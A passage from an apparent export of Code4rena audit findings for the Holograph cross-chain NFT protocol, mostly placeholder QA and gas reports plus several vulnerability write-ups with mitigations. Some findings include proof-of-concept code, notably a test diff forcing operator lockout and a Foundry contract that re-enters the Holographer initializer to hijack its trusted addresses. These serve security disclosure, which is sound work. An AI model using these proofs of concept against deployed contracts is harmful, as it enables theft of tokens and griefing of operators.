the described scenario.  ## Tools Used VSCode  ## Recommended Mitigation Steps In the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/416", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "An attacker can lock operator out of the pod by setting gas limit that's higher than the block gas limit of dest chain", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/414", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415   # Vulnerability details   When a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user. Given that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.  ## Impact Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.  The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` * `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and 200 Gwei gas = 4 Matic, for Avalanche the block gas limit seems to be 8M and the price ~30 nAVAX = 0.24 AVAX ). Plus, the operator isn't going to receive that amount.  ## Proof of Concept The following test demonstrates this scenario:  ```diff diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts index 1f2b959..a1a23b7 100644 --- a/test/06_cross-chain_minting_tests_l1_l2.ts +++ b/test/06_cross-chain_minting_tests_l1_l2.ts @@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              gasLimit: TESTGASLIMIT,            })          ); +        estimatedGas = BigNumber.from(50_000_000);          // process.stdout.write('\\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\\n');            let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload( @@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),              payload            ); - +        estimatedGas = BigNumber.from(5_000_000); +                  process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());          await expect(            adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [ @@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              payload,              {                gasPrice: GASPRICE, -              gasLimit: executeJobGas(payload), +              gasLimit: 5_000_000,              },            ])          ) ```  The test would fail with the following output:  ```   1) Testing cross-chain minting (L1 & L2)        Deploy cross-chain contracts via bridge deploy          hToken            deploy l1 equivalent on l2:      VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left ```  ## Recommended Mitigation Steps Limit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/405", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/399", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/397", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/394", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/392", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/391", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/389", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/387", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/380", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/378", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/376", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/371", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/370", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "If user sets a low `gasPrice` the operator would have to choose between being locked out of the pod or executing the job anyway", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/364", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294   # Vulnerability details  During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`. The amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens). However, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job. The operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.   ## Impact Operator would be loosing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs). This could also be used by attackers to make operators pay for the attackers' expensive gas tasks: * They can deploy their own contract as the 'source contract' * Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed * They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)  ## Proof of Concept * An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.): > When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod. * Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code. * There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.  ## Recommended Mitigation Steps  Allow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/363", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/362", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/361", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/360", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/358", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/356", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/355", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/350", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/333", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/330", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/329", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/328", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/327", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/326", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/324", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Bond tokens (HLG) can get permanently stuck in operator", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/322", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857   # Vulnerability details  ## Impact Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.  ## Proof of Concept The `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:  ```js ... if (job.operator != address(0)) {     ...     if (job.operator != msg.sender) {         //perform time and gas price check         if (timeDifference < 6) {             // check msg.sender == correct fallback operator         }         // slash primary operator         uint256 amount = _getBaseBondAmount(pod);         _bondedAmounts[job.operator] -= amount;         _bondedAmounts[msg.sender] += amount;          //determine if primary operator retains his job         if (_bondedAmounts[job.operator] >= amount) {             ...         } else {             ...         }     } } // execute the job ``` In case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:  ```js require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, \"HOLOGRAPH: operator is bonded\"); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.  Alternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/316", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/315", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/314", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/313", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "selected-for-report", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/311", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/308", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Wrong slashing calculation rewards for operator that did not do his job", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/307", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382   # Vulnerability details  ## Impact  Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.  ## Proof of Concept  [Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.  The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole _getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)  ```         uint256 amount = _getBaseBondAmount(pod);         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Documentation states that only a portion should be slashed and the number of slashes should be noted down.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/300", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/298", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Source contract can steal NFTs from users", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/290", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577   # Vulnerability details  ## Impact A source contract can burn and transfer NFTs of users without their permission. ## Proof of Concept Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)): ```solidity function sourceBurn(uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _burn(wallet, tokenId); }  function sourceTransfer(address to, uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _transferFrom(wallet, to, tokenId); } ```  While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. ## Tools Used Manual review ## Recommended Mitigation Steps Consider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/285", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/278", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/271", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "ApprovalAll event is missing parameters", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/270", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392   # Vulnerability details  ## Impact beforeApprovalAll() / afterApprovalAll() can only pass \"to\" and \"approved\", missing \"owner\", if contract listening to this event,but does not know who approve it, so can not react to this event Basically, this event cannot be used  ## Proof of Concept ```   function setApprovalForAll(address to, bool approved) external { ....      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {       require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner     }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {       require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner     }   } ```  ## Tools Used  ## Recommended Mitigation Steps   add parameter: owner   ``` interface HolographedERC721 { ...  - function beforeApprovalAll(address _to, bool _approved) external returns (bool success); + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);  - function afterApprovalAll(address _to, bool _approved) external returns (bool success); + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success); ```  ```   function setApprovalForAll(address to, bool approved) external {      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) { -     require(SourceERC721().beforeApprovalAll(to, approved));  +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved));      }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) { -      require(SourceERC721().afterApprovalAll(to, approved)); +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));     }   } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/267", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/265", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/258", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/235", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/227", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/226", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/224", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/222", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Holographable tokens can be reinitialized", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/215", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L147-L169   # Vulnerability details  When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.  However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.   One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.  ## Proof of Concept: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../contracts/HolographFactory.sol\"; import \"../contracts/HolographRegistry.sol\"; import \"../contracts/Holograph.sol\"; import \"../contracts/enforcer/HolographERC20.sol\";  //Contract used to show reentrancy in initializer contract SourceContract {     address public holographer;     MockContract public mc;      constructor() {          mc = new MockContract();     }      //function that reenters the holographer and sets this contract as the new holograph slot     function init(bytes memory initPayload) external returns(bytes4) {         assembly {             sstore(holographer.slot, caller())         }         bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(\"0xabc\"), address(this)), bytes(\"0x0\"));          holographer.call(abi.encodeWithSignature(\"init(bytes)\", initCode));         return InitializableInterface.init.selector;     }      function getRegistry() external view returns (address) {         return address(this);     }      function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {         return address(mc);     }      function isTheHolograph() external pure returns (bool) {         return true;     }  }  //simple extension contract to return easily during reinitialization contract MockContract {     constructor() {}      function init(bytes memory initPayload) external pure returns(bytes4) {         return InitializableInterface.init.selector;     } }  contract HolographTest is Test {     DeploymentConfig public config;     Verification public verifiedSignature;     HolographFactory public hf;     HolographRegistry public hr;     Holograph public h;     HolographERC20 public he20;      uint256 internal userPrivateKey;     address internal hrAdmin;     mapping(uint256 => bool) public _burnedTokens;     address internal user;     function setUp() public {         //Creating all of the required objects         hf = new HolographFactory();         hr = new HolographRegistry();         h = new Holograph();         he20 = new HolographERC20();          //Setting up the registry admin         hrAdmin = vm.addr(100);          //Creating factory, holograph, and registry init payloads         bytes memory hfInitPayload = abi.encode(address(h), address(hr));         hf.init(hfInitPayload);         bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));         h.init(hInitPayload);         bytes32[] memory reservedTypes = new bytes32[](1);         reservedTypes[0] = \"0xabc\";         bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);          //Setting up a 